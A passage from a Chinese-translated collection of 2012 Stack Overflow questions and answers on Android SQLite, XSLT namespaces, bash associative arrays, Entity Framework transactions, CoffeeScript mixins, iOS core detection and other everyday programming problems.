        List<Contact> contactList = new ArrayList<Contact>();
        // Select All Query
        String selectQuery = "SELECT  * FROM " + TABLE_CONTACTS;

        SQLiteDatabase db = this.getWritableDatabase();
        Cursor cursor = db.rawQuery(selectQuery, null);

        // looping through all rows and adding to list
        if (cursor.moveToFirst()) {
            do {
                Contact contact = new Contact();
                contact.setID(Integer.parseInt(cursor.getString(0)));
                contact.setName(cursor.getString(1));
                contact.setPhoneNumber(cursor.getString(2));
                // Adding contact to list
                contactList.add(contact);
            } while (cursor.moveToNext());
        }

        // return contact list
        return contactList;
    }

    public int getContactsCount() {
        String countQuery = "SELECT  * FROM " + TABLE_CONTACTS;
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor cursor = db.rawQuery(countQuery, null);
        cursor.close();

        // return count
        return cursor.getCount();
    }

    public int updateContact(Contact contact) {
        SQLiteDatabase db = this.getWritableDatabase();

        ContentValues values = new ContentValues();
        values.put(KEY_NAME, contact.getName());
        values.put(KEY_PH_NO, contact.getPhoneNumber());

        // updating row
        return db.update(TABLE_CONTACTS, values, KEY_ID + " = ?",
                new String[] { String.valueOf(contact.getID()) });
    }

    public void deleteContact(Contact contact) {
        SQLiteDatabase db = this.getWritableDatabase();
        db.delete(TABLE_CONTACTS, KEY_ID + " = ?",
                new String[] { String.valueOf(contact.getID()) });
        db.close();
    }

} 
```

这是我的 MainActivity

```
package de.linde.sqlite;

import java.util.List;

import android.os.Bundle;
import android.util.Log;
import android.app.Activity;

public class MainActivity extends Activity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_main);

        DatabaseHandler db = new DatabaseHandler(this);

        Log.d("Insert: ", "Inserting .."); 
        db.addContact(new Contact("Wladimir","024324324"));
        db.addContact(new Contact("Max","0324324324"));
        db.addContact(new Contact("Benny","0324324"));
        db.addContact(new Contact("derSchwarze","051324324"));

        Log.d("Reading: ","Reading all Contacts..");
        List<Contact> contacts = db.getAllContacts();

        for (Contact cn : contacts) {

            String log = "Id: " + cn.getID() + " ,Name: " + cn.getName() + " ,Phone: " + cn.getPhoneNumber();
            Log.d("Name: ", log); 
        }
    }

} 
```

我的**activity_main.xml**

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent" >

</RelativeLayout> 
```

我做错了什么:(

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-11T12:22:16.140

`CREATE_CONTACTS_TABLE`在添加的值和连接的字符串之间添加空格，以便构建有效的表创建字符串：

```
"CREATE TABLE " + TABLE_CONTACTS + " (" + KEY_ID + " INTEGER PRIMARY KEY, " + KEY_NAME + " TEXT, " + KEY_PH_NO + " TEXT)"; 
```

您需要从手机/模拟器中卸载该应用程序，然后再次运行它以重新创建数据库。

同样的事情对 onUpgrade 方法中的 String 也是有效的：

```
"DROP TABLE IF EXISTS " + TABLE_CONTACTS 
```

# node.js - nodejs 和 webserver 通信

> ID：12839163
> 
> 赞同：0
> 
> 时间：2012-10-11T12:07:17.453
> 
> 标签：node.js, socket.io

这似乎是一个愚蠢的问题，但是否可以在 web 服务器和 nodejs 应用程序之间建立连接？我知道我可以从 nodejs 服务器发出请求，但是可以反过来做吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T18:34:56.817

假设有问题的网络服务器允许您进行传出网络连接，您只需使用它所具有的任何功能来连接到您的 node.js 服务器并发出请求，无论是 HTTP 请求还是一些通用的 TCP 请求。例如，如果网络服务器正在运行 PHP，您可能会使用`cURL`PHP 模块来建立 HTTP 连接，或者与`fsockopen()`原始TCP 连接一起使用。`fread()``fwrite()`

请注意，某些托管安排可能不允许传出连接。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T13:31:26.553

您可以使用[request](https://github.com/mikeal/request#readme) -library 向另一个 node.js 服务器发出 HTTP 请求。

# xml - 使用 XSLT 转换 XML 文件时无法从我的 XML 文件中获取值

> ID：12839164
> 
> 赞同：1
> 
> 时间：2012-10-11T12:07:20.673
> 
> 标签：xml, xslt, xpath

我创建了一个小应用程序，用于将系统中的 XML 转换为使用 XSLT 的客户所需的新 XML 格式。问题是，我似乎无法检索 XML 节点的值，它们都是空的。

这是我的 XSLT 文件：

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt" exclude-result-prefixes="msxsl"
>
  <xsl:output method="xml" indent="yes" />

  <xsl:template match="/">
    <test>
      <xsl:apply-templates select="SourceEndpoint" />
    </test>
  </xsl:template>

  <xsl:template match="SourceEndpoint">
    <InvoiceAmount>
      <xsl:value-of select="." />
    </InvoiceAmount>
  </xsl:template>
</xsl:stylesheet> 
```

我的原始 XML 确实有一个名为的节点，`SourceEndpoint`所以我不确定我在这里做错了什么？

我也试过：`<xsl:value-of select="Envelope/Header/SourceEndpoint" />`而不是模板，但我得到了相同的结果

## 编辑

这是我的原始 XML 的片段：

```
<Envelope xmlns="http://schemas.microsoft.com/dynamics/2008/01/documents/Message">
  <Header>
    <MessageId>{11EA62F5-543A-4483-B216-91E526AE2319}</MessageId> 
    <SourceEndpoint>Test</SourceEndpoint> 
    <DestinationEndpoint>TestInvoice</DestinationEndpoint> 
  </Header>
</Envelope> 
```

`Envelope`是整个文件的根

在转换后的 XML 中，测试如下所示：`<test />`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:41:49.943

**XML 文件在默认命名空间中——而不是在“null”命名空间中。这有很大的不同**。

搜索 XPath 和默认命名空间，您会发现许多好的答案。

本质上，您必须在 XSLT 转换中定义相同的名称空间，并为其关联一个前缀（比如“x”）。

然后在任何 XPath 表达式（匹配模式是一种 XPath 表达式）中使用`x:someName`代替`someName`.

**所提供代码的另一个问题**是它试图将元素`SourceEndpoint`作为文档的顶部元素进行访问——在这种情况下，顶部元素具有不同的名称。

**纠正这两个问题，我们得到以下转换**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:x="http://schemas.microsoft.com/dynamics/2008/01/documents/Message"
 exclude-result-prefixes="x">
    <xsl:output method="xml" indent="yes" />

    <xsl:template match="/">
        <test>
            <xsl:apply-templates select="/*/*/x:SourceEndpoint" />
        </test>
    </xsl:template>

    <xsl:template match="x:SourceEndpoint">
        <InvoiceAmount>
            <xsl:value-of select="." />
        </InvoiceAmount>
    </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于提供的 XML 文档时：**

```
<Envelope xmlns="http://schemas.microsoft.com/dynamics/2008/01/documents/Message">
    <Header>
        <MessageId>{11EA62F5-543A-4483-B216-91E526AE2319}</MessageId>
        <SourceEndpoint>Test</SourceEndpoint>
        <DestinationEndpoint>TestInvoice</DestinationEndpoint>
    </Header>
</Envelope> 
```

**产生了想要的正确结果**：

```
<?xml version="1.0" encoding="utf-8"?>
<test>
   <InvoiceAmount>Test</InvoiceAmount>
</test> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:12:35.630

要获取节点的值，请使用

```
 <xsl:template match="//SourceEndpoint">
    <InvoiceAmount>
      <xsl:value-of select="./text()" />
    </InvoiceAmount>
  </xsl:template> 
```

# magento - 在自定义付款方式中获取订单 ID：Mage_Payment_Model_Method_Abstract

> ID：12839166
> 
> 赞同：0
> 
> 时间：2012-10-11T12:07:33.740
> 
> 标签：magento, payment-gateway

我正在为商店开发一种新的付款方式，但我被困在可以退款的方法中。在此功能中，我需要找到一种方法来获取发票的订单 ID 以进行退款。我应该如何进行？

```
 class Company_Module_Model_Standard extends Mage_Payment_Model_Method_Abstract
  {
    (...)
    public function canRefund() // we need a way to get the orderId
    {
      $client = $this->_getCLient();
      $client->loadOrder($orderId); // <------ here I would need the order id or increment id
      $ret = $client->canRefund();
      return $ret;
    }
    (...)
  } 
```

我希望你能帮助我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T14:07:30.733

试试这个：

```
$paymentInfo = $this->getInfoInstance();
$orderId = $paymentInfo->getOrder()->getRealOrderId(); 
```

# bash - bash中的关联数组

> ID：12839174
> 
> 赞同：-1
> 
> 时间：2012-10-11T12:07:53.877
> 
> 标签：bash, shell, sed, hashtable

[我在这里](https://stackoverflow.com/questions/688849/associative-arrays-in-shell-scripts)找到了关联数组的实现， 并想了解代码的实际作用。这是我不理解的代码片段，希望能得到解释。'

```
put() {
    if [ "$#" != 3 ]; then exit 1; fi  
    mapName=$1; key=$2; value=`echo $3 | sed -e "s/ /:SP:/g"`  #dont understand 
    eval map="\"\$$mapName\""  **#dont understand** 
    map="`echo "$map" | sed -e "s/--$key=[^ ]*//g"` --$key=$value"  #dont understand 
    eval $mapName="\"$map\""  #dont understand 
}
get() {
    mapName=$1; key=$2

    map=${!mapName}
    #dont understand 
    value="$(echo $map |sed -e "s/.*--${key}=\([^ ]*\).*/\1/" -e 's/:SP:/ /g' )"  
}

getKeySet() {
    if [ "$#" != 1 ]; 
    then 
        exit 1; 
    fi

    mapName=$1; 

    eval map="\"\$$mapName\""

    keySet=`
           echo $map | 
           sed -e "s/=[^ ]*//g" -e "s/\([ ]*\)--/\1/g"   #dont understand 
          ` 
} 
```

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-11T12:18:13.217

所以首先按不明白的顺序：

1.  这只是检查你总是有 3 个函数参数，如果提供了不同的数字，则以 1（错误）退出
2.  这通过将它们替换为`:SP:`这样来`Hi how are you`逃避空格字符`Hi:SP:how:SP:are:SP:you`
3.  该映射存储在一个 var 中，其名称是提供给 put 的第一个参数。所以这一行将以下文本添加到 var 中 --$key=$value ，这里的 key 是第二个参数， value 是转义的第三个参数
4.  get 只是将作为第二个参数提供的键的值存储在值中（第一个是地图的名称）

为了更好地理解，请尝试在每次操作后打印您决定用于地图的变量。你会很容易看到 ;) 希望这可以说清楚。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:23:07.107

我将尝试解释您突出显示的每一行：

```
 if [ "$#" != 3 ]; then exit 1; fi   #dont understand 
```

如果不完全是三个参数，则退出并出错。

```
 mapName=$1; key=$2; value=`echo $3 | sed -e "s/ /:SP:/g"`  #dont understand 
```

1.  `$mapName`使用第一个参数的值设置变量
2.  `$key`使用第二个参数的值设置变量
3.  `$value`在用字符串替换空格后，使用第三个参数的值设置变量`:SP:`。

    ```
    map="`echo "$map" | sed -e "s/--$key=[^ ]*//g"` --$key=$value"  #dont understand 
    ```

这将编辑`$map`变量，删除第一次出现的值，`$key`然后`=`是非空格字符，然后附加字符串，`--`然后是 的值`$key`，然后是`=`的值`$value`。

```
 eval $mapName="\"$map\""  #dont understand 
```

这将评估由该行生成的字符串。假设`$mapName`is`myMap`和`$map`is `value`，bash 将评估的字符串是：

```
myMap="value" 
```

所以它实际上会设置一个变量，它的名称将通过一个参数传递。

```
 map=${!mapName} 
```

这将`$map`使用与 中的值同名的变量的值来设置变量`$mapName`。示例：假设`$mapName`has `a`，`$map`则以 的内容结束`a`。

```
 value="$(echo $map |sed -e "s/.*--${key}=\([^ ]*\).*/\1/" -e 's/:SP:/ /g' )" 
```

在这里，我们将`$value`变量的值设置为变量的值`$map`，经过几次编辑：

1.  仅提取在 sed 表达式中括号之间的表达式中指定的内容，它匹配不是空格的字符。它之前的文本指定匹配应该从哪里开始，所以在这种情况下，空格必须在字符串`--`之后开始，然后是`$key`变量的值，然后是`=`. 开头和结尾的 `.*' 与该行的其余部分相匹配，并用于在之后删除它们。
2.  恢复空间，即。替换`:SP:`为实际空格。

    ```
    eval map="\"\$$mapName\"" 
    ```

这将创建一个值为“$mapName”的字符串，即。一个美元，后跟 mapName 中包含的字符串，用双引号括起来。求值时，这将获取名称为 的内容的变量的值`$mapName`。

希望这会有所帮助=)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T16:41:25.020

Bash，从第 4 版及更高版本开始，具有内置的关联数组。
要使用它们，您需要声明一个`declare -A`

```
#!/usr/bin/env bash

declare -A arr    # 'arr' will be an associative array
                  # now fill it with: arr['key']='value'
arr=(
    [foo]="bar"
    ["nyan"]="cat"
    ["a b"]="c d"
    ["cookie"]="yes please"
    ["$USER"]="$(id "$LOGNAME")"
)

#    -- cmd --                  -- output --
echo "${arr[foo]}"            # bar
echo "${arr["a b"]}"          # c d

user="$USER"
echo "${arr["$user"]}"        # uid=1000(c00kiemon5ter) gid=100...

echo "${arr[cookie]}"         # yes please
echo "${arr[cookies]}"        # <no output - empty value> :(

# keys and values
printf '%s\n' "${arr[@]}"     # print all elements, each on a new line
printf '%s\n' "${!arr[@]}"    # print all keys,     each on a new line

# loop over keys - print <key :: value>
for key in "${!arr[@]}"
do printf '%s :: %s\n' "$key" "${arr["$key"]}"
done

# you can combine those with bash parameter expansions, like
printf '%s\n' "${arr[@]:0:2}" # print only first two elements
echo "${arr[cookie]^^}"       # YES PLEASE 
```

# asp.net - Ajax 组合框列表在 Jquery 选项卡下向右移动

> ID：12839176
> 
> 赞同：0
> 
> 时间：2012-10-11T12:08:04.613
> 
> 标签：asp.net, ajax, combobox, tabs

我一直在我的项目中到处使用相同的 Ajax 组合框，但是一旦我在 jquery 选项卡控件下使用 Ajax 组合框，列表就会向右移动，并且 UI 显得模糊。我不想从 ajax 转移到 jquery 组合框和自动完成，因为我只想解决这个问题。下面是我的代码：

```
<ajax:ComboBox ID="LenCompDpd" runat="server" Width="133px" CssClass="AquaStyle     textfont"
OnSelectedIndexChanged="LenCompDpd_SelectedIndexChanged" AutoPostBack="true"
                                    DropDownStyle="DropDown" AutoCompleteMode="SuggestAppend" CaseSensitive="false"
                                    ItemInsertLocation="OrdinalText" /> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T15:38:46.020

这是因为 jQuery UI 的 css 设置与 Ajax ComboBox 的 css 设置混淆了，这是一个简单的示例，我必须在页面中设置 ComboBox 的样式以调整来自 jQuery 的 css 使其看起来正常：

```
<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="Tabs.aspx.cs" Inherits="WebApplication1.Tabs" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
    <link rel="stylesheet" href="http://code.jquery.com/ui/1.9.0/themes/base/jquery-ui.css" />    
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.8.2.js"></script>    
    <script type="text/javascript" src="http://code.jquery.com/ui/1.9.0/jquery-ui.js"></script>
    <script type="text/javascript">        
        $(function () { $("#tabs").tabs(); });    
    </script>
    <style type="text/css">
        .ajax__combobox_itemlist
        {
            left: 28px !important;            
            top: 103px !important;
        }
    </style>
</head>
<body>
    <form id="form1" runat="server">
        <asp:ScriptManager ID="ScriptManager1" runat="server">
        </asp:ScriptManager>
        <div id="tabs">    
            <ul>        
                <li><a href="#tabs-1">Nunc tincidunt</a></li>        
                <li><a href="#tabs-2">Proin dolor</a></li>
            </ul>    
            <div id="tabs-1">
                   <ajaxToolkit:ComboBox ID="ComboBox1" runat="server" 
                        AutoPostBack="False" 
                        DropDownStyle="DropDownList">
                        <asp:ListItem Text="One"></asp:ListItem>
                       <asp:ListItem Text="Two" />
                       <asp:ListItem Text="Three" />
                    </ajaxToolkit:ComboBox>
            </div>    
            <div id="tabs-2">        

            </div>    
        </div>
    </form>
</body>
</html> 
```

诀窍是使用 ComboBox 的 css 类，如 .ajax__combobox_itemlist 来调整样式，使其与 jQuery 的东西一起使用。

# asp.net - 处理在 ASP.NET 中过期的会话

> ID：12839181
> 
> 赞同：-1
> 
> 时间：2012-10-11T12:08:14.833
> 
> 标签：asp.net

有多少种方法可以延长 ASP.net 中的会话过期时间？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:14:52.330

您可以尝试使用`Session_End`in `Global.asax`，在会话结束时引发事件

链接： http: [//msdn.microsoft.com/en-US/library/ee255109 (v=bts.10).aspx](http://msdn.microsoft.com/en-US/library/ee255109(v=bts.10).aspx)

```
public class Global : System.Web.HttpApplication
{
        void Session_End(object sender, EventArgs e)
        {
            // Code that runs when a session ends. 
            // Note: The Session_End event is raised only when the sessionstate mode
            // is set to InProc in the Web.config file. If session mode is set to StateServer 
            // or SQLServer, the event is not raised.

        }

} 
```

# android - 在 Android 中的 Image 上设计动态热点

> ID：12839182
> 
> 赞同：3
> 
> 时间：2012-10-11T12:08:17.387
> 
> 标签：android, imageview, onclicklistener

我必须开发如下 UI：

![在此处输入图像描述](../Images/9110563fd70a744d0e139238c94114d0.png)

我想显示这种类型的图像并在该图像上显示热点。如果圆将绘制在原始图片上，热点的位置将是动态的，根据 x、y 和半径。用户可以单击热点，onclick 操作将在用户将单击的特定热点上定义。

开发此类 UI 的最佳流程是什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-16T23:21:17.617

制作您的主布局 a`RelativeLayout`然后您可以使用以下代码以编程方式将 a 添加到您的布局中`ImageView`：`onClickListener`

```
private void addImageView(RelativeLayout mainLayout, int x, int y, int width, int height, OnClickListener onClickListener){
    ImageView imageView = new ImageView(this);
    imageView.setAdjustViewBounds(false);
    RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
    params.height = height;
    params.width = width;
    imageView.setLayoutParams(params);
    imageView.setScaleType(ImageView.ScaleType.FIT_XY);  //remove this if you want to keep aspect ratio
    imageView.setImageDrawable(getResources().getDrawable(R.drawable.ic_launcher)); //here goes your drawable
    params.leftMargin = x - width/2;
    params.topMargin = y - height/2;
    imageView.setOnClickListener(onClickListener);
    mainLayout.addView(imageView);
} 
```

要使用它，您可以调用：

```
 RelativeLayout mainLayout = (RelativeLayout) findViewById(R.id.relativeLayout); //this is your main layout
    addImageButton(mainLayout, 200, 300, 200, 200, new OnClickListener() {

        @Override
        public void onClick(View v) {
            Toast.makeText(MainActivity.this, "clicked", Toast.LENGTH_SHORT).show();
        }
    }); 
```

您也可以使用 a`ImageButton`来实现相同的效果，尽管图像大小会受到按钮边框的影响：

```
private void addImageButton(RelativeLayout mainLayout, int x, int y, int width, int height, OnClickListener onClickListener){
    ImageButton imageButton = new ImageButton(this);
    imageButton.setAdjustViewBounds(true);
    RelativeLayout.LayoutParams params = new RelativeLayout.LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);
    params.height = height;
    params.width = width;
    imageButton.setLayoutParams(params);
    imageButton.setScaleType(ImageView.ScaleType.FIT_XY);
    imageButton.setImageDrawable(getResources().getDrawable(R.drawable.ic_launcher));
    params.leftMargin = x - width/2;
    params.topMargin = y - height/2;
    imageButton.setOnClickListener(onClickListener);
    mainLayout.addView(imageButton);
} 
```

试试看。

# coffeescript - 在 Coffeescript 中使用 mixins

> ID：12839183
> 
> 赞同：3
> 
> 时间：2012-10-11T12:08:19.950
> 
> 标签：coffeescript, mixins

我想通过使用 mixins 来拆分一个大类。

我正在使用[Little Book中的这个 mixin 代码](http://arcturo.github.com/library/coffeescript/03_classes.html)

```
@include: (obj) ->
    for key, value of obj when key not in moduleKeywords
      # Assign properties to the prototype
      @::[key] = value

    obj.included?.apply(@)
    this 
```

* * *

```
class FooMixin

  b: => @something = 2

class Foo extends Module
  @include FooMixin

  a: => @something = 1 
```

问题是`@`in `FooMixin`is `FooMixin`。我希望它是`Foo`。

我尝试`_.bind(@::[key], @)`在末尾添加该行，`@include()`但没有帮助。有什么建议么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-11T14:10:03.387

好吧，我做错了几件事。

1.

`@include`来自小书的对象不是类。要让它与你需要编写的类一起工作`@include FooMixin::`。但是，我从那以后开始使用对象。

2.

当使用对象而不是类时，粗箭头会在 CoffeeScript 包装器的顶部添加一行，内容为`_this = this`. 所有方法都绑定到全局上下文，这不是我们想要的。为了解决这个问题，我们必须将粗箭头转换为细箭头，并将每个函数绑定到我们的`Foo`实例。使用下划线我将它添加到构造函数中`Foo`：

```
constructor: ->
  for fname in _.functions FooMixin
    @[fname] = _.bind @[fname], @
  super 
```

我试过`_.bindAll @, _.functions FooMixin`了，但它给了我一个错误，说类似`At Function.bind, could not run bind of undefined.`奇怪的错误，因为上面的代码与方法几乎相同`_.bindAll`。

所以现在我可以拆分我的类以获得更好的可读性和代码共享。

* * *

**更新：** _.bindAll 的问题在于它需要一个 splat 而不是一个数组。修复是使用`_.bindAll @, _.functions(FooMixin)...`.

**更新：**找到了更好的解决方案。

与原帖相同。使用混合类。

使用`@include FooMixin::`或更改`@include`以对原型而不是属性进行操作。

在`Foo`构造函数中写入`FooMixin.call @`正确绑定方法。

这很好用，而且很干净。

唯一的潜在问题是 mixins 将被现有属性覆盖。我可以看到解决这个问题的唯一方法是执行以下操作：

```
after = ->
  _.extend Foo, FooMixin::

class Foo
   # define...

after() 
```

或者将 extend 方法传递给，`_.defer`但这太难了，可能行不通。

# c# - 在我的情况下应该使用交易吗？

> ID：12839187
> 
> 赞同：1
> 
> 时间：2012-10-11T12:08:49.403
> 
> 标签：c#, .net, entity-framework, transactions

这是一个引用“因此，如果您只使用一个对象上下文，那么在使用 ObjectContext.SaveChanges 方法时，您已经内置了对数据库事务的支持。” 我在这里找到[http://www.luisrocha.net/2011/08/managing-transactions-with-entity.html](http://www.luisrocha.net/2011/08/managing-transactions-with-entity.html)

所以据此，我不必`TransactionScope`在下面的代码中使用，对吧？

```
if (isLastCallSuccess)
 {
   if (condition1) //it's clear, no transaction needed
    {
      product.Property1 = true;
      context.SaveChanges();
    }

    else if (condition2)
     {
      using (TransactionScope scope = new TransactionScope()) //do I need it?
      {
        context.DeleteObject(item);             //deleting
        context.AddObject("product", new product      //adding
                                {
                                    Id = oldObject.Id,
                                    Property1 = true
                                });
        context.SaveChanges(System.Data.Objects.SaveOptions.DetectChangesBeforeSave);
                                scope.Complete();
        context.AcceptAllChanges();

        }
      } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-11T12:13:20.137

我个人会保留`TransactionScope`，因此所有内容都作为一个整体提交或在错误时回滚（即您的保存或添加失败）。如果并发是您的应用程序的主要部分，那么使用这将使您的用户受益，确保数据的完整性是一致的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-11T12:14:33.663

我不同意; 因为您对数据有多个操作，并且您希望确保操作完全成功或完全失败（原子）。确保你是原子的也是一个好习惯。

如果您的删除有效，但您的添加失败，那么您的数据库将处于错误状态。至少如果你有一个事务，数据库会回到你尝试第一次操作之前的原始状态。

编辑：

只是为了完成，在事务内部，当您开始在同一方法/进程中操作多个表时，能够随时回滚事务至关重要。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T12:16:10.407

引用的意思是单个调用`SaveChanges`会自动包装在事务中，因此它是原子的。但是，您要`SaveChanges`多次调用，因此为了使更大的操作成为原子操作，您需要使用当前拥有的事务。

所以，是的，你需要它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-11T12:19:11.827

我相信在您的情况下，您确实需要使用事务。`SaveChanges`创建一个隐式事务，这样当它持久化对任何对象的更改并且该更改无法持久化时，它会回滚它尝试进行的所有其他更改。但是由创建的事务`SaveChanges`只与调用本身一样长。如果您要调用`SaveChanges`两次，并且希望在第二次调用失败时回滚第一次调用的操作，那么是的，您需要一个包含两个调用的事务，您发布的代码就是这样做的。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-11T14:23:31.537

从我的阅读方式来看，您担心删除和添加未提交到数据库，如果失败则回滚事务。我认为您不需要将插入和删除包装在事务中，因为如上所述，这一切都发生在一个隐含事务管理的 savechanges() 上。因此，如果它确实失败了，更改将被回滚。

# .net - 通用集合对象

> ID：12839195
> 
> 赞同：0
> 
> 时间：2012-10-11T12:09:09.867
> 
> 标签：.net, c#-4.0, generics

我有一堂课如下：

```
public class RecipientEmailDetails
{
    public string Name { get; set; }
    public string Email { get; set; }
    public List<VacancyEmailDetails> Vacancies { get; set; }
} 
```

需要更改此类以允许空缺接受通用数据，例如如下：

```
public class RecipientEmailDetails<T>
{
    public string Name { get; set; }
    public string Email { get; set; }
    public List<T> Vacancies { get; set; }
} 
```

不幸的是，目前如果我这样做，我需要更改所有实例化这个类的代码（很多很多位置）以包含这个新的泛型类型，例如改变这个：

```
List<RecipientEmailDetails> recipientEmailDetails = wrapper.GetRecipientEmails(emailCount); 
```

对此：

```
List<RecipientEmailDetails<VacancyEmailDetails> recipientEmailDetails =   wrapper.GetRecipientEmails(emailCount); 
```

最终，这是很多变化，并且这些当前位置中的许多将不知道（理想情况下应该不知道）什么类型的数据存储在空缺中。他们将简单地转发此信息，直到最终检查和处理空缺列表。

无论如何，切入正题，我正在寻找将通用数据存储在 Vacancy 中的巧妙方法，而不必在任何地方更改 RecipientEmailDetails 对象的初始化方式。我宁愿不必装箱和拆箱。

我应该补充一点，VacancyEmailDetails 目前是这样的：

```
public class VacancyEmailDetails
{
    public string Id { get; set; }
    public string Name { get; set; }
    public string Location { get; set; }
    public string Salary { get; set; }
    public string Notes { get; set; }
} 
```

在所有情况下，都需要空位来保存与此类似的对象，即主要是具有很少或很少方法的数据成员。然而，这些成员的数量、名称和类型会有很大差异。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-11T12:14:19.287

引入一个接口`IRecipientEmailDetails`，让你的类实现它并改变`GetRecipientEmails`方法来返回这个接口。

```
public interface IRecipientEmailDetails {} 
```

以及您班级中的方法：

```
public IRecipientEmailDetails GetRecipientEmails(string emailCount) { } 
```

一种或另一种方式，您将不得不更改您的代码。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-11T12:15:33.857

您可以使用接口来定义允许的内容，例如：

```
public class RecipientEmailDetails
{
    public string Name { get; set; }
    public string Email { get; set; }
    public List<ISomeCommonInterface> Vacancies { get; set; }
} 
```

所有类都实现了这一点。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-11T15:03:57.197

感谢您的回复。我决定反对接口，而是将类重新定义为：

```
public class RecipientEmailDetails
{        
    public string Name { get; set; }
    public string Email { get; set; }
    public List<Dictionary <string, string>> Vacancies { get; set; }
} 
```

唯一必须改变的地方是几行，例如：

```
new RecipientEmailDetails{
    Name = "Test1",
    Email = "Test@hotmail.com",
    Vacancies = vacancies.Select(z => new VacancyEmailDetails{
                                           Id = z.Id.ToString(),
                                           Notes = z.Notes
                                       }).ToList()}; 
```

对这些：

```
new RecipientEmailDetails{
    Name = "Test1",
    Email = "Test@hotmail.com",                                       
    Vacancies = vacancies.Select(z => new []{
new {Key = "Id", Value = z.Id.ToString()},
new {Key = "Notes", Value = z.Notes}}.ToDictionary(d => d.Key, d => d.Value)).ToList()}) 
```

这使我能够做我需要的事情，并且只需要在我填充和从中提取数据时明确关注空缺的内容，而不是在所有引用 RecipientEmailDetails 的地方。

# ios - 检测 iOS 设备上的 CPU 内核

> ID：12839196
> 
> 赞同：5
> 
> 时间：2012-10-11T12:09:12.303
> 
> 标签：ios, objective-c, grand-central-dispatch

我正在`dispatch_async`使用 iphone 4s 和 ipad 1st gen 编写一些代码并获得不同的结果。

我想知道这是否是由于 CPU 的内核数量所致。是否可以在运行时检测 iOS 设备的内核数或 CPU 类型，以便我可以`dispatch_async`在 4s 上，但不能在 ipad 上？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-10-11T12:17:48.550

下面是检测 iOS 设备内核数量的代码：

```
#include <sys/sysctl.h>

unsigned int countCores()
{
    size_t len;
    unsigned int ncpu;

    len = sizeof(ncpu);
    sysctlbyname ("hw.ncpu",&ncpu,&len,NULL,0);

    return ncpu;
} 
```

除此之外，您可以检查`[[UIDevice currentDevice] userInterfaceIdiom]`以确定设备是 iPhone 还是 iPad。像这样：

```
if ([[UIDevice currentDevice] userInterfaceIdiom] == UIUserInterfaceIdiomPad) {
    NSLog(@"iPad");
}
else {
    NSLog(@"iPhone");
} 
```

[参考](https://stackoverflow.com/questions/7241936/how-do-i-detect-a-dual-core-cpu-on-ios)

# java - 如何在表格单元格中添加复选框和组合框？

> ID：12839200
> 
> 赞同：4
> 
> 时间：2012-10-11T12:09:30.680
> 
> 标签：java, swing, jtable, jcombobox, jcheckbox

我正在创建一个包含表格和一些按钮的表单。

一张图片胜过千言万语：

![在此处输入图像描述](../Images/a03ba4c363e72cd9c222c948f01c7bd6.png)

如何将复选框和组合框放入表格中？

我正在使用 NetBeans。我尝试使用拖放但没有用。

这是我的表单代码。

```
public class HttpOutput extends javax.swing.JPanel {
    HttpElements current_Http_EleObject;
    /**
     * Creates new form HttpOutput
     */
    public HttpOutput(HttpElements httpelements) {
        initComponents();
        current_Http_EleObject=httpelements;
         TableColumn includeColumn = jTable1.getColumnModel().getColumn(0);
            includeColumn.setCellEditor(new DefaultCellEditor(new JCheckBox()));
    } 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-11T16:18:37.327

这是组合单元格插图复制演示：

![在此处输入图像描述](../Images/8383b2c56a274df72b833b6f3ee88a36.png)

```
import java.awt.*;
import java.awt.event.*;
import java.util.EventObject;
import javax.swing.*;
import javax.swing.event.*;
import javax.swing.table.*;

public class ComboCellInsetsDemo {
  public JComponent makeUI() {
    String[] columnNames = {"Name", "Check", "Condition"};
    Object[][] data = {
      {"bbb", false, "="}, {"aaa", true, "<"}
    };
    DefaultTableModel model = new DefaultTableModel(data, columnNames) {
      @Override public Class<?> getColumnClass(int column) {
        return getValueAt(0, column).getClass();
      }
    };
    JTable table = new JTable(model);
